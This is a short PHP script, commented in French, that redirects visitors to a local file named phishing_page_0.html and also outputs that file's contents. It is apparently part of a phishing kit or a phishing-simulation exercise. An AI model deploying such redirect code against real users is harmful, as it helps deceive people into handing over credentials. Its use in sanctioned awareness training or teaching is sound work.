<?php
// Redirige l'utilisateur vers la page de phishing
header("Location: phishing_page_0.html");
echo file_get_contents("phishing_page_0.html");
exit();
?>
